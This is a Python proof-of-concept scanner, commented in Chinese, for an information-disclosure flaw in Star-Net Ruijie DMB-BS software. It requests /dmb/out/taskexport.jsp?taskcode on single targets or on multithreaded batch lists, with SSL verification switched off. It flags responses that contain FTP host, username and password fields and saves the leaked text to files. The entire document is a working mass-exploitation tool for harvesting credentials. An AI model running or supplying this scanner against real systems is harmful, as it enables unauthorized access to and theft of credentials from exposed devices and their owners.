import argparse
import requests
import sys
import json
import urllib3
from multiprocessing.dummy import Pool
from datetime import datetime

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def poc(target):
    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    payload = "/dmb/out/taskexport.jsp?taskcode"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
    }

    try:
        # 检查目标可达性
        response1 = requests.get(
            url=target, 
            timeout=8, 
            headers=headers, 
            verify=False,
            allow_redirects=True
        )
        
        if response1.status_code != 200:
            print(f'[*] {target} 响应异常: {response1.status_code}')
            return False

        # 检测漏洞
        response2 = requests.get(
            url=target + payload, 
            timeout=8, 
            headers=headers, 
            verify=False,
            allow_redirects=False
        )
        
        # 漏洞判断条件
        if (response2.status_code == 200 and 
            len(response2.text) > 100 and
            any(indicator in response2.text for indicator in ['ftp host', 'ftp username', 'password'])):
            
            print(f'[+] 存在漏洞: {target}')
            save_result(target, response2.text)
            return True
        else:
            print(f'[-] 不存在: {target}')
            return False
            
    except requests.exceptions.Timeout:
        print(f'[!] 超时: {target}')
    except requests.exceptions.ConnectionError:
        print(f'[!] 连接失败: {target}')
    except Exception as e:
        print(f'[!] 错误: {target} - {str(e)}')
    
    return False

def save_result(target, response_text):
    """保存结果"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open('result.txt', 'a', encoding='utf-8') as f:
        f.write(f'[{timestamp}] 星网锐捷信息泄露漏洞 {target}\n')
    
    # 可选：保存详细响应
    filename = f"response_{target.replace('://', '_').replace('/', '_')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(response_text[:2000])

def main():
    parser = argparse.ArgumentParser(description="星网锐捷 DMB-BS-taskexport.jsp 信息泄露漏洞检测")
    parser.add_argument('-u', '--url', help='单个URL检测')
    parser.add_argument('-f', '--file', help='批量检测文件')
    parser.add_argument('-t', '--threads', type=int, default=50, help='线程数')
    parser.add_argument('-o', '--output', default='result.txt', help='输出文件')
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        return
    
    print("警告: 已禁用SSL证书验证")
    
    if args.url:
        poc(args.url)
    else:
        try:
            with open(args.file, 'r', encoding='utf-8') as f:
                targets = [line.strip() for line in f if line.strip()]
            
            print(f'[+] 加载 {len(targets)} 个目标')
            
            with Pool(min(args.threads, 100)) as pool:  # 限制最大线程数
                results = pool.map(poc, targets)
            
            vulnerable_count = sum(1 for r in results if r)
            print(f'\n[+] 扫描完成! 存在漏洞: {vulnerable_count}/{len(targets)}')
            
        except FileNotFoundError:
            print(f'[!] 文件不存在: {args.file}')

if __name__ == '__main__':
    main()